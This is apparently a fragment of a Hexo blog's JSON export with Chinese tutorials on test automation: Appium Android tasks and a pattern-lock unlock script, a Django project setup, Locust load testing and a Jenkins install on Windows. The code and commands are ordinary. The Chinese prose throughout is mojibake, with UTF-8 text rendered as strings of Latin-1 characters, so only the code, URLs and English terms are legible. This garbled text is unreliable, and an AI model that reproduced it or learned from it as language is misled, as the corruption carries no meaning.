å¦ä¸€ä¸ªæ˜¯å‘é€é‚®ä»¶å‡½æ•°ï¼Œå°†æŠ¥å‘Šå‘é€ç»™è‡ªå·±çš„é‚®ç®±å®ç°ç®€å•ç›‘æ§çš„ç›®çš„ã€‚ä¸Šä¸€æ­¥ç”¨HTMLTestRunnerå·²ç»åœ¨æœ¬åœ°ç”Ÿæˆäº†æ‰§è¡ŒæŠ¥å‘Šï¼Œå°†æŠ¥å‘Šæ·»åŠ è‡³é™„ä»¶å‘é€å³å¯ï¼Œå‘é€é‚®ä»¶çš„æ¨¡å—å¯ä»¥å‚è€ƒä¹‹å‰çš„è¿™ç¯‡æ–‡ç« ï¼šã€Šå®šæ—¶ä»»åŠ¡ä¸Pythonå‘é€é‚®ä»¶(Windowså¹³å°)ã€‹ã€‚ æœ€åä¾æ¬¡æ‰§è¡Œå¯åŠ¨appiumæœåŠ¡ï¼Œå¯åŠ¨å®‰å“æ¨¡æ‹Ÿå™¨ï¼Œæ‰§è¡Œä»»åŠ¡ï¼Œå‘é€é‚®ä»¶ï¼Œå…³é—­æ¨¡æ‹Ÿå™¨ï¼Œå…³é—­appiumæœåŠ¡å³å¯è‡ªåŠ¨å®Œæˆæ•´å¥—æµç¨‹ã€‚ 123456789if __name__ == '__main__': process() #æ‰“å°å½“å‰å¼€å‘è¿›åº¦ start_appium_server() #å¯åŠ¨appiumæœåŠ¡ start_android_devices() #å¯åŠ¨æ¨¡æ‹Ÿå™¨ time.sleep(15) run_tasks() #æ‰§è¡ŒAPPä»»åŠ¡ send_mail() #å‘é€é‚®ä»¶ stop_android_devices() #å…³é—­æ¨¡æ‹Ÿå™¨ stop_appium_server() # å…³é—­appiumæœåŠ¡ æ‰§è¡ŒæŠ¥å‘Š ç»¿è‰²ä»£è¡¨è¯¥APPä»»åŠ¡æ‰§è¡ŒæˆåŠŸå¹¶æ–­è¨€æ­£ç¡®ã€‚ æ©™è‰²ä»£è¡¨è¯¥APPä»»åŠ¡æ‰§è¡ŒæˆåŠŸä½†æ–­è¨€é”™è¯¯ï¼Œè¯·æŸ¥çœ‹æˆªå›¾æ–‡ä»¶æˆ–è€…æ‰“å¼€APPç¡®è®¤ä»»åŠ¡æ˜¯å¦å®Œæˆã€‚ çº¢è‰²ä»£è¡¨ä»»åŠ¡æ‰§è¡Œå¤±è´¥ï¼Œå¯èƒ½æ˜¯APPæœ‰æ›´æ–°ï¼Œé¡µé¢çªç„¶æœ‰æ´»åŠ¨/å¹¿å‘Šå¼¹çª—æˆ–è€…ç½‘ç»œé—®é¢˜å¯¼è‡´ï¼Œè¯·æ£€æŸ¥ç½‘ç»œå’ŒAPPã€‚ ![](http://my.lipeilipei.top/17-12-19/36574735.jpg) peili ---","categories":[{"name":"æµ‹è¯•","slug":"æµ‹è¯•","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"è‡ªåŠ¨åŒ–","slug":"è‡ªåŠ¨åŒ–","permalink":"http://yoursite.com/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"APP","slug":"APP","permalink":"http://yoursite.com/tags/APP/"},{"name":"appium","slug":"appium","permalink":"http://yoursite.com/tags/appium/"},{"name":"unittest","slug":"unittest","permalink":"http://yoursite.com/tags/unittest/"}]},{"title":"python+djangoå®ç°ç™»é™†åŠŸèƒ½ï¼ˆä¸Šç¯‡ï¼‰","slug":"python+djangoå®ç°ç™»é™†åŠŸèƒ½ï¼ˆä¸Šç¯‡ï¼‰","date":"2017-11-07T05:30:00.000Z","updated":"2018-12-17T02:30:56.827Z","comments":true,"path":"2017/11/07/python+djangoå®ç°ç™»é™†åŠŸèƒ½ï¼ˆä¸Šç¯‡ï¼‰/","link":"","permalink":"http://yoursite.com/2017/11/07/python+django%E5%AE%9E%E7%8E%B0%E7%99%BB%E9%99%86%E5%8A%9F%E8%83%BD%EF%BC%88%E4%B8%8A%E7%AF%87%EF%BC%89/","excerpt":"","text":"å®‰è£…djangoå‰ææ˜¯å·²ç»å®‰è£…pythonå¹¶è®¾ç½®å¥½äº†ç¯å¢ƒå˜é‡ï¼Œç„¶ååœ¨cmdå‘½ä»¤è¡Œç›´æ¥é€šè¿‡pipå®‰è£…djangoã€‚ 1pip install Django åˆ›å»ºé¡¹ç›®åœ¨å‘½ä»¤è¡Œè¾“å…¥å‘½ä»¤ï¼Œé¡¹ç›®ä¼šåˆ›å»ºåœ¨æ‰§è¡Œå‘½ä»¤æ‰€åœ¨çš„ç›®å½•ï¼Œä¾‹å¦‚è¿™é‡Œç”Ÿæˆåä¸ºgustçš„é¡¹ç›®ã€‚ 1django-admin startproject gust åˆ›å»ºAPPä¸Šä¸€æ­¥åˆ›å»ºé¡¹ç›®åè‡ªåŠ¨åˆ›å»ºäº†gustçš„ç›®å½•ï¼Œcdè¿›å…¥gustç›®å½•ï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤åˆ›å»ºä¸€ä¸ªç­¾åˆ°ç³»ç»Ÿçš„appæ¨¡å—ï¼Œç„¶ååœ¨é¡¹ç›®settings.pyæ–‡ä»¶çš„â€INSTALLED_APPSâ€é‡Œæ·»åŠ â€signâ€ã€‚ 1python manage.py startapp sign æ­¤æ—¶å°±åˆ›å»ºå¥½äº†é¡¹ç›®å’Œappã€‚signç›®å½•ä¸‹è¿˜æœ‰ä¸¤ä¸ªæ‰‹åŠ¨åˆ›å»ºçš„æ–‡ä»¶å¤¹staticå’Œtemplatesï¼Œåˆ†åˆ«å­˜æ”¾å›¾ç‰‡,cssé™æ€æ–‡ä»¶å’Œhtmlå‰ç«¯é¡µé¢ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™ä¸¤ä¸ªæ–‡ä»¶å¤¹çš„åç§°æ˜¯å›ºå®šå†™æ³•ï¼Œä¸è¦éšæ„å‘½åã€‚ å¯åŠ¨é¡¹ç›®1python manage.py runserver é»˜è®¤ç«¯å£æ˜¯8000ï¼Œå¦‚æœç«¯å£è¢«å ç”¨ï¼Œä¿®æ”¹ç«¯å£çš„è¯åœ¨ä¸Šé¢å‘½ä»¤çš„æœ€ååŠ ä¸Šéœ€è¦ä¿®æ”¹çš„ç«¯å£å·ã€‚ 1python manage.py runserver 8001 åœ¨cmdçª—å£å¤åˆ¶urlåˆ°æµè§ˆå™¨http://127.0.0.1:8000/ï¼Œçœ‹åˆ°ä¸‹é¢è¿™ä¸ªå›¾å°±è¡¨ç¤ºå·²ç»å¯åŠ¨æˆåŠŸã€‚ åˆ›å»ºè¶…çº§ç®¡ç†å‘˜1python manage.py createsuperuser è¾“å…¥usernameï¼šadminè¾“å…¥Emailï¼šxxxx@qq.comè¾“å…¥å¯†ç ï¼šxxxç¡®è®¤å¯†ç ï¼šxxx(æ³¨ï¼šè¾“å…¥å¯†ç çš„è¿‡ç¨‹ä¸­ä¸ä¼šæœ‰æ˜¾ç¤º) ç”Ÿæˆè¡¨1python manage.py migrate djangoè‡ªå¸¦äº†åŠŸèƒ½æ¯”è¾ƒå®Œå–„çš„åå°ç®¡ç†ç³»ç»Ÿï¼Œä¸ç”¨æˆ‘ä»¬å†å»å¼€å‘åå°ï¼Œè¿™ä¹Ÿæ˜¯djangoå¼ºå¤§çš„åœ°æ–¹ä¹‹ä¸€ï¼Œç°åœ¨å°±å¯ä»¥ç”¨åˆšåˆšåˆ›å»ºçš„ç®¡ç†å‘˜è´¦å·ç™»é™†åå°äº†ã€‚ http://127.0.0.1:8000/admin ç›¸å…³æ–‡ç« python+djangoå®ç°ç™»é™†åŠŸèƒ½ï¼ˆä¸‹ç¯‡ï¼‰xx","categories":[{"name":"Webå¼€å‘","slug":"Webå¼€å‘","permalink":"http://yoursite.com/categories/Web%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"django","slug":"django","permalink":"http://yoursite.com/tags/django/"}]},{"title":"appium ä¹å®«æ ¼è§£é”ï¼ˆpythonï¼‰","slug":"appium-ä¹å®«æ ¼è§£é”","date":"2017-10-19T10:30:00.000Z","updated":"2018-12-17T02:30:56.857Z","comments":true,"path":"2017/10/19/appium-ä¹å®«æ ¼è§£é”/","link":"","permalink":"http://yoursite.com/2017/10/19/appium-%E4%B9%9D%E5%AE%AB%E6%A0%BC%E8%A7%A3%E9%94%81/","excerpt":"","text":"äº¬ä¸œé‡‘èAPPä¸ºä¾‹åˆšå¼€å§‹æƒ³çš„æ˜¯å…ˆè·å–çˆ¶çº§æ ‡ç­¾ç„¶åæŒ‰ç…§æ¯”ä¾‹è®¡ç®—æ¯ä¸ªç‚¹çš„ä½ç½®ï¼Œè¿™æ ·ç®—å‡ºæ¥ç›¸å¯¹ä½ç½®ï¼Œå¥½å¤„æ˜¯æ— è®ºåœ¨ä»€ä¹ˆåˆ†è¾¨ç‡çš„è®¾å¤‡ä¸‹æ‰§è¡Œè„šæœ¬éƒ½èƒ½æ­£å¸¸æ‰§è¡Œã€‚ä½†æ˜¯äº¬ä¸œé‡‘èè¿›å…¥é¡µé¢çš„ä¹å®«æ ¼9ä¸ªç‚¹å¹¶ä¸æ˜¯åœ¨ä¸€ä¸ªçˆ¶å…ƒç´ é‡Œé¢ï¼Œè€Œæ˜¯æ•´ä¸ªé¡µé¢è¢«ç­‰åˆ†æˆä¸‰å—ï¼Œå› æ­¤è¿™ç§æ–¹æ³•å¹¶ä¸å¥½ç”¨ï¼Œåªèƒ½é€€è€Œæ±‚å…¶æ¬¡ç›´æ¥ç”¨æ¯ä¸ªç‚¹çš„åæ ‡æ¥å®šä½äº†ã€‚ ç”¨åˆ°çš„æ–¹æ³•123from appium.webdriver.common.touch_action import TouchAction.TouchAction(driver).press(x&#x3D;180, y&#x3D;598).move_to(x&#x3D;0, y&#x3D;0).wait(100).move_to(x&#x3D;0, y&#x3D;181).wait(100)xxxxxxçœç•¥xxxxxx.move_to(x&#x3D;181,y&#x3D;0).release().perform() é¦–å…ˆè¦æ˜ç¡®çš„æ˜¯è¿™ä¸ªæ–¹æ³•æ»‘åŠ¨ä¸æ˜¯é€šè¿‡æ¯ä¸¤ä¸ªç‚¹çš„ç»å¯¹åæ ‡æ¥æ“ä½œçš„ï¼Œè€Œæ˜¯ä¸¤ä¸ªç‚¹ä¹‹é—´çš„åç§»é‡æ¥æ“ä½œçš„ï¼Œå‘å³å‘ä¸‹æ»‘åŠ¨åç§»é‡ä¸ºæ­£ï¼Œå‘å·¦å‘ä¸Šæ»‘åŠ¨åç§»é‡ä¸ºè´Ÿã€‚ è¯¦ç»†æ“ä½œæ‰‹æœºå¼€å¯å¼€å‘è€…é€‰é¡¹ï¼Œåœ¨å¼€å‘è€…é€‰é¡¹é‡Œé¢æ‰“å¼€&quot;æŒ‡é’ˆä½ç½®&quot;,è¿™æ ·é¼ æ ‡ç‚¹å‡»æˆ–è€…æ»‘åŠ¨çš„æ—¶å€™ä¸Šé¢å°±èƒ½å®æ—¶æ˜¾ç¤ºæ¨ªçºµåæ ‡ã€‚ 1.ç¡®å®šä¹å®«æ ¼å·¦ä¸Šè§’ç¬¬ä¸€ä¸ªç‚¹çš„ç»å¯¹åæ ‡TouchAction(driver).pressæ–¹æ³•é‡Œç¬¬ä¸€ä¸ªç‚¹çš„åæ ‡è¦å†™å®Œæ•´åæ ‡ï¼Œä¸æ˜¯åç§»é‡ï¼Œå¹¶ä¸”æ˜¯ç‚¹ä¸¤æ¬¡ï¼Œåªç‚¹ä¸€æ¬¡çš„è¯ä¼šè·³è¿‡ç¬¬ä¸€ä¸ªç‚¹ï¼Œæ‰€ä»¥å…ˆå†™TouchAction(driver).press(x=180, y=598)ï¼Œç„¶å.move_to(x=0, y=0)ï¼Œæ¨ªçºµåæ ‡åç§»é‡éƒ½æ˜¯0ï¼Œä¹Ÿå°±æ˜¯ç§»åŠ¨åˆ°ç¬¬ä¸€ä¸ªç‚¹å®ƒæœ¬èº«ï¼Œç›¸å½“äºæŒ‰ä½ç¬¬ä¸€ä¸ªç‚¹ã€‚ 2.ç¡®å®šç¬¬äºŒä¸ªç‚¹çš„åæ ‡åç§»é‡ç¬¬äºŒä¸ªç‚¹ä¿®æ”¹åç§»é‡.move_to(x=0, y=181)ï¼Œåœ¨ç¬¬ä¸€ä¸ªç‚¹çš„åŸºç¡€ä¸Šå‘ä¸‹æ»‘åŠ¨181ä¸ªåƒç´ ï¼Œå³æ¨ªåæ ‡ä¸å˜ï¼Œçºµåæ ‡å†™181ï¼Œåé¢çš„ç‚¹ä¾æ¬¡ç±»æ¨ï¼Œæ¯ä¸ªç‚¹çš„æ»‘åŠ¨å®ŒæˆååŠ ä¸Š.wait(100)ç­‰å¾…æ—¶é—´ã€‚ ç¤ºä¾‹æˆªå›¾åŠä»£ç  123456789101112131415161718192021#coding=utf-8from appium import webdriverimport timefrom appium.webdriver.common.touch_action import TouchActiondef jd_finance(package_name,activity_name): #å¯åŠ¨åº”ç”¨ desired_caps = &#123;&#125; desired_caps['platformName'] = 'Android' desired_caps['platformVersion'] = '5.1' desired_caps['deviceName'] = 'emulator-5554' desired_caps['appPackage'] = package_name desired_caps['appActivity'] = activity_name desired_caps[\"unicodeKeyboard\"] = \"True\" desired_caps[\"resetKeyboard\"] = \"True\" driver = webdriver.Remote('http://localhost:4723/wd/hub', desired_caps) time.sleep(5) #æ»‘åŠ¨è§£é”ä¹å®«æ ¼ TouchAction(driver).press(x=180, y=598).move_to(x=0, y=0).wait(100).move_to(x=0, y=181).wait(100).move_to(x=0, y=181).wait(100).move_to(x=181, y=0).wait(100).move_to(x=181,y=0).release().perform() peili","categories":[{"name":"æµ‹è¯•","slug":"æµ‹è¯•","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"è‡ªåŠ¨åŒ–","slug":"è‡ªåŠ¨åŒ–","permalink":"http://yoursite.com/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"APP","slug":"APP","permalink":"http://yoursite.com/tags/APP/"},{"name":"appium","slug":"appium","permalink":"http://yoursite.com/tags/appium/"}]},{"title":"æ€§èƒ½æµ‹è¯• - locustç®€å•ä½¿ç”¨","slug":"locust","date":"2017-09-15T04:30:00.000Z","updated":"2018-12-17T02:30:56.877Z","comments":true,"path":"2017/09/15/locust/","link":"","permalink":"http://yoursite.com/2017/09/15/locust/","excerpt":"","text":"locustç®€ä»‹ Locustæ˜¯ä¸€ä¸ªç”¨äºå¯æ‰©å±•çš„ï¼Œåˆ†å¸ƒå¼çš„ï¼Œæ€§èƒ½æµ‹è¯•çš„ï¼Œå¼€æºçš„ï¼Œç”¨Pythonç¼–å†™æ¡†æ¶/å·¥å…·ï¼Œå®ƒéå¸¸å®¹æ˜“ä½¿ç”¨ï¼Œä¹Ÿéå¸¸å¥½å­¦ã€‚å®ƒçš„ä¸»è¦æ€æƒ³å°±æ˜¯æ¨¡æ‹Ÿä¸€ç¾¤ç”¨æˆ·å°†è®¿é—®ä½ çš„ç½‘ç«™ã€‚æ¯ä¸ªç”¨æˆ·çš„è¡Œä¸ºç”±ä½ ç¼–å†™çš„pythonä»£ç å®šä¹‰ï¼ŒåŒæ—¶å¯ä»¥ä»Webç•Œé¢ä¸­å®æ—¶è§‚å¯Ÿåˆ°ç”¨æˆ·çš„è¡Œä¸ºã€‚ ç»è¿‡ä¸æ–­çš„æ›´æ–°ï¼Œç°åœ¨å¯¹python2å’Œpython3éƒ½èƒ½å¾ˆå¥½çš„æ”¯æŒã€‚[å®˜ç½‘åœ°å€] ä¼˜åŠ¿1.å®‰è£…æ“ä½œéƒ½å¾ˆç®€å•ï¼Œæ²¡æœ‰è‡ƒè‚¿çš„å®¢æˆ·ç«¯ï¼Œé€šè¿‡pythonè¯­è¨€çµæ´»ç¼–å†™æµ‹è¯•è„šæœ¬2.åŸºäºåç¨‹è€Œä¸æ˜¯çº¿ç¨‹å’Œè¿›ç¨‹ï¼Œç›¸æ¯”è¾ƒLRå’Œjmeteræ›´èŠ‚çº¦æœºå™¨èµ„æºï¼Œå•æœºèƒ½æ¨¡æ‹Ÿæ›´å¤šçš„ç”¨æˆ· å¼±åŠ¿1.å¸‚åœºå æœ‰ç‡ä½ï¼Œç”¨æˆ·ç¾¤ä½“å°‘ï¼Œå¯ä¾›å‚è€ƒçš„æ–‡ç« æ•™ç¨‹ä¹Ÿæœ‰é™2.æ²¡æœ‰å½•åˆ¶åŠŸèƒ½ï¼Œåªèƒ½æ‰‹åŠ¨ç¼–å†™æµ‹è¯•è„šæœ¬ï¼Œéœ€è¦ä¸€å®šçš„pythonç¼–ç¨‹èƒ½åŠ› locustå®‰è£…å¯ä»¥ç›´æ¥ç”¨pipå®‰è£…ï¼Œæˆ–è€…ä¸‹è½½å®‰è£…åŒ…åˆ°æœ¬åœ°ï¼Œè§£å‹ä»¥åç”¨python setup.py installå®‰è£…,python3å®‰è£…çš„æ—¶å€™ä¼šè‡ªåŠ¨æŠŠä¾èµ–åº“éƒ½å®‰è£…å¥½ã€‚ 1. ç›´æ¥ç”¨pipå®‰è£…1pip install locustio 2.æŠ¥é”™è§£å†³æˆ‘åœ¨ä½¿ç”¨çš„æ—¶å€™å‘ç°ç¬¬ä¸€ç§pipå®‰è£…æ–¹å¼å®‰è£…æˆåŠŸåï¼Œå¯åŠ¨locust --helpå‘½ä»¤çš„æ—¶å€™å¯èƒ½ä¼šå‡ºç°å¦‚ä¸‹é”™è¯¯ã€‚ImportError: No module named &#39;core&#39;è§£å†³åŠæ³•ï¼š1.å…ˆå¸è½½æ‰ç¬¬ä¸€æ¬¡å®‰è£…çš„ï¼Œå¸è½½å‘½ä»¤ 1pip uninstall locustio 2.ç„¶åå†è¾“å…¥å¦‚ä¸‹å‘½ä»¤ä»GitHubè·å–æºç å®‰è£… 1pip install git+https:&#x2F;&#x2F;github.com&#x2F;locustio&#x2F;locust ç®€å•æ€§èƒ½æµ‹è¯•è„šæœ¬æ–°å»ºä¸€ä¸ª.pyæ–‡ä»¶ï¼Œç¼–å†™å¦‚ä¸‹æ¯”è¾ƒç®€å•çš„æµ‹è¯•è„šæœ¬å¹¶ä¿å­˜ã€‚ 1234567891011121314from locust import HttpLocust,TaskSet,task#å®šä¹‰ç”¨æˆ·è¡Œä¸ºclass TestBaiDu(TaskSet): @task def baidu_page(self): self.client.get(&#39;&#x2F;&#39;) #è¿™é‡Œä¸å¡«å†™å…·ä½“çš„é“¾æ¥ï¼Œæ‰§è¡Œå‘½ä»¤çš„æ—¶å€™å†æŒ‡å®šclass WebsiteUser(HttpLocust): task_set &#x3D; TestBaiDu min_wait &#x3D; 3000 #è®¾ç½®é€‚å½“çš„ç­‰å¾…æ—¶é—´ï¼Œæ¨¡æ‹ŸçœŸå®ç”¨æˆ·è¡Œä¸ºï¼Œå•ä½æ˜¯æ¯«ç§’ max_wait &#x3D; 5000 å¯åŠ¨locustå‘½ä»¤å‰æï¼šlocust.exeå¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„ç»æ·»åŠ åˆ°ç¯å¢ƒå˜é‡ 1locust -f xxx.py --host&#x3D;http:&#x2F;&#x2F;www.baidu.com éœ€è¦æµ‹è¯•å“ªä¸ªurlï¼Œå¯ä»¥åœ¨è¾“å…¥å‘½ä»¤æ—¶éšæ—¶å¾ˆæ–¹ä¾¿çš„æ›´æ”¹ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆä¸åœ¨å‰é¢çš„è„šæœ¬é‡ŒæŠŠurlå†™æ­»çš„åŸå› ï¼Œè¿™é‡Œä»¥ç™¾åº¦é¦–é¡µä¸ºä¾‹ã€‚ å¼€å§‹æ‰§è¡Œæœ¬æœºæµè§ˆå™¨è¿›å…¥ http://localhost:8089 ã€‚locustæœ¬èº«æ²¡æœ‰ç”¨æˆ·ç•Œé¢ï¼Œè¿™ä¸ªç•Œé¢æ—¶åŸºäºflaskæ¡†æ¶å¼€å‘çš„webé¡µé¢ï¼Œå› æ­¤flaskåº“ä¹Ÿæ˜¯å®ƒå¿…è£…çš„ä¾èµ–åº“ã€‚ç¬¬ä¸€ä¸ªè¾“å…¥æ¡†ï¼šè¯·æ±‚æ€»ç”¨æˆ·æ•°ç¬¬äºŒä¸ªè¾“å…¥æ¡†ï¼šæ¯ç§’è¯·æ±‚çš„ç”¨æˆ·æ•° ä¸»è¦æŒ‡æ ‡ median è¯·æ±‚å“åº”æ—¶é—´çš„ä¸­ä½æ•° ï¼ˆæ¯«ç§’ï¼‰ average ç›¸åº”æ—¶é—´å¹³å‡æ•°ï¼ˆæ¯«ç§’ï¼‰ min æœ€å°å€¼ï¼ˆæ¯«ç§’ï¼‰ max æœ€å¤§å€¼ï¼ˆæ¯«ç§’ï¼‰ content size é¡µé¢è¿”å›çš„å¤§å°ï¼ˆå•ä½æ˜¯bï¼‰ è¶‹åŠ¿å›¾ç‚¹å‡»ä¸Šæ–¹å¯¼èˆªæ åˆ‡æ¢åˆ°chartsï¼Œå¯ä»¥çœ‹åˆ°å›¾ç¤ºåŒ–çš„æŠ˜çº¿å›¾ï¼ŒåŒ…æ‹¬TPS,å¹³å‡å“åº”æ—¶é—´ï¼Œç”¨æˆ·æ€»æ•°ç­‰ å¯¼å‡ºæ•°æ®ç‚¹å‡»ä¸Šæ–¹å¯¼èˆªæ åˆ‡æ¢åˆ°Download Dataï¼Œå¯ä»¥ä¸‹è½½CSVæ ¼å¼çš„æµ‹è¯•æ•°æ® æ€»ç»“ä»¥ä¸Šç½‘é¡µåªèƒ½å±•ç¤ºæœ€åŸºæœ¬çš„ä¿¡æ¯ï¼Œåœ¨æµ‹è¯•çš„æ—¶å€™ç»“åˆè§‚çœ‹æœåŠ¡å™¨çš„èµ„æºæƒ…å†µï¼Œå¾—å‡ºåˆç†çš„ç»“è®ºï¼Œlocustæ˜¯ä¸€ä¸ªéå¸¸ä¾¿äºæ“ä½œçš„æ€§èƒ½æµ‹è¯•å·¥å…·ï¼Œå­¦ä¹ æˆæœ¬ä½ï¼Œå¾ˆå®¹æ˜“ä¸Šæ‰‹ï¼Œå®ƒä¸ä»…èƒ½æµ‹è¯•ç®€å•çš„å°ç³»ç»Ÿï¼Œé…åˆpyzmqåº“ä¹Ÿèƒ½å¯¹å¤§å‹ç³»ç»Ÿè¿›è¡Œå¤šæœºåˆ†å¸ƒå¼å‹æµ‹ï¼Œlocustç°åœ¨è¿˜æ²¡æœ‰æˆä¸ºä¸»æµæ€§èƒ½æµ‹è¯•å·¥å…·ï¼Œç›®å‰è¿™ä¸ªå·¥å…·çš„æ›´æ–°è¿˜æ˜¯æ¯”è¾ƒé¢‘ç¹ï¼Œåœ¨æœªæ¥ä½¿ç”¨åº”è¯¥ä¼šè¶Šæ¥è¶Šå¹¿æ³›ã€‚xx","categories":[{"name":"æµ‹è¯•","slug":"æµ‹è¯•","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"æ€§èƒ½æµ‹è¯•","slug":"æ€§èƒ½æµ‹è¯•","permalink":"http://yoursite.com/tags/%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"name":"locust","slug":"locust","permalink":"http://yoursite.com/tags/locust/"}]},{"title":"æ¥å£è‡ªåŠ¨åŒ–-JenkinsæŒç»­é›†æˆ","slug":"Jenkinså®‰è£…ä¸ä½¿ç”¨","date":"2017-08-31T10:30:00.000Z","updated":"2018-12-17T02:30:56.795Z","comments":true,"path":"2017/08/31/Jenkinså®‰è£…ä¸ä½¿ç”¨/","link":"","permalink":"http://yoursite.com/2017/08/31/Jenkins%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/","excerpt":"","text":"å®‰è£…JDK1.ä¸‹è½½JDKï¼Œä¸‹è½½åœ°å€ç‚¹å‡»[ç½‘ç›˜é“¾æ¥]ï¼Œå¯†ç ï¼š30bs2.é…ç½®ç¯å¢ƒå˜é‡æ–°å»ºJAVA_HOMEç³»ç»Ÿç¯å¢ƒå˜é‡ï¼Œå˜é‡å€¼å¤„è¾“å…¥JDKå®‰è£…ç›®å½•ï¼Œå¦‚â€D:\\Program Files\\Java\\jdk1.8.0_131â€œæ–°å»ºCLASSPATHå˜é‡ï¼Œå˜é‡å€¼ä¸ºâ€.;%JAVA_HOME%\\lib\\dt.jar;%JAVA_HOME%\\lib\\tools.jarâ€œ,è¿™é‡Œæ³¨æ„æœ€å‰é¢æœ‰ä¸ªç‚¹ä¿®æ”¹Pathå˜é‡ï¼Œåœ¨æœ€åæ·»åŠ â€;%JAVA_HOME%\\binâ€œåœ¨cmdä¸­è¾“å…¥â€java -versionâ€œï¼Œçœ‹åˆ°ç‰ˆæœ¬ä¿¡æ¯å°±æ˜¯å·²ç»å®‰è£…é…ç½®æˆåŠŸã€‚ jenkinså®‰è£…ä¸é…ç½®1.ä¸‹è½½å®‰è£…è¿™é‡Œå®‰è£…é…ç½®çš„å¹³å°æ˜¯Windowså¹³å°ï¼Œæ•´ä¸ªå®‰è£…è¿‡ç¨‹ä¹Ÿæ˜¯æ¯”è¾ƒç®€å•ã€‚ æ–¹æ³•ä¸€ï¼šé¦–å…ˆè¿›å…¥[Jenkinså®˜ç½‘]ä¸‹è½½Windowså¹³å°çš„å®‰è£…åŒ…ï¼Œé¡µé¢å¾€ä¸‹æ‹‰ä¼šçœ‹åˆ°ä¸åŒå¹³å°çš„ä¸‹è½½è¿æ¥ï¼Œç‚¹å‡»Windowsï¼Œä¸‹è½½çš„æ˜¯ä¸ª.zipå‹ç¼©åŒ…ï¼Œè§£å‹ä»¥åå¾—åˆ°.msiå®‰è£…åŒ…ï¼Œç›´æ¥åŒå‡»è¿è¡Œé»˜è®¤å®‰è£…å³å¯ã€‚ æ–¹æ³•äºŒï¼šè·Ÿä¸Šä¸€æ­¥ä¸€æ ·ï¼Œè¿›å…¥å®˜ç½‘ä¸‹è½½æœ€ä¸‹é¢.waræ ¼å¼çš„åŒ…ï¼Œç„¶ååœ¨æœ¬åœ°æ‰“å¼€cmdå‘½ä»¤è¡Œï¼Œè¾“å…¥å‘½ä»¤ 1java -jar jenkins.war æ³¨ï¼šå¦‚æœä¸æ˜¯åœ¨jenkins.waræ‰€åœ¨çš„è·¯å¾„æ‰§è¡Œå‘½ä»¤çš„è¯ï¼Œè¦åœ¨å‘½ä»¤é‡Œé¢å†™ä¸Šjenkins.warçš„å®Œæ•´è·¯å¾„ã€‚ å®‰è£…å®Œæˆåé»˜è®¤æµè§ˆå™¨ä¼šè‡ªåŠ¨æ‰“å¼€jenkinsä¸»é¡µï¼šhttp://localhost:8080 ï¼ŒJenkinsçš„é»˜è®¤ç«¯å£æ˜¯8080ã€‚ 2.è¾“å…¥å¯†é’¥é¦–æ¬¡è¿›å…¥Jenkinsä¸»é¡µåä¼šæœ‰ä¸‹å›¾è¿™æ ·çš„æç¤ºï¼Œåœ¨æç¤ºçš„è·¯å¾„ä¸‹æ‰¾åˆ°è¿™ä¸ªå¯†é’¥æ–‡ä»¶ï¼Œç”¨è®°äº‹æœ¬æ‰“å¼€å¤åˆ¶å¯†ç åˆ°è¿™ä¸ªè¾“å…¥æ¡†ï¼Œç‚¹å‡»â€continueâ€ 3.å®‰è£…æ’ä»¶åœ¨è¿™ä¸€æ­¥æœ‰ä¸¤ä¸ªé€‰é¡¹ï¼Œæ¨èå®‰è£…æ’ä»¶å’Œè‡ªå·±é€‰æ‹©å®‰è£…å“ªäº›æ’ä»¶ï¼Œå¦‚æœä¸ç¡®å®šçš„è¯ï¼Œç›´æ¥ç‚¹å‡»å·¦è¾¹çš„æ¨èå®‰è£…ï¼Œå¸¸ç”¨çš„æ’ä»¶å°±ç›´æ¥å¼€å§‹å®‰è£…ï¼Œè¿™ä¸ªè¿‡ç¨‹æŒç»­å‡ åˆ†é’Ÿï¼Œæœ‰è¿›åº¦æ¡æç¤ºã€‚ 4.åˆ›å»ºè´¦æˆ·ä¸Šä¸€æ­¥å®Œæˆåè‡ªåŠ¨è¿›å…¥è¿™ä¸ªé¡µé¢ï¼Œå¡«å†™ç”¨æˆ·åå¯†ç é‚®ç®±ç­‰ï¼Œç‚¹å‡»â€save and finishâ€å³å¯å®Œæˆé…ç½®ï¼Œå†ç‚¹å‡»â€start use jenkinsâ€å°±è¿›å…¥äº†Jenkinsçš„é¦–é¡µï¼Œæ•´å®‰è£…è¿‡ç¨‹å°±å®Œæˆäº†ã€‚xx","categories":[{"name":"æµ‹è¯•","slug":"æµ‹è¯•","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"æŒç»­é›†æˆ","slug":"æŒç»­é›†æˆ","permalink":"http://yoursite.com/tags/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/"},{"name":"è‡ªåŠ¨åŒ–","slug":"è‡ªåŠ¨åŒ–","permalink":"http://yoursite.com/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"Jenkins","slug":"Jenkins","permalink":"http://yoursite.com/tags/Jenkins/"}]},{"title":"å®šæ—¶ä»»åŠ¡ä¸Pythonå‘é€é‚®ä»¶(Windowså¹³å°)","slug":"windowså®šæ—¶ä»»åŠ¡å’Œpythonå‘é€é‚®ä»¶","date":"2017-08-25T10:30:00.000Z","updated":"2020-05-22T06:43:55.594Z","comments":true,"path":"2017/08/25/windowså®šæ—¶ä»»åŠ¡å’Œpythonå‘é€é‚®ä»¶/","link":"","permalink":"http://yoursite.com/2017/08/25/windows%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%92%8Cpython%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6/","excerpt":"","text":"å‰è¨€ä¸Šä¸€ç¯‡æ–‡ç« 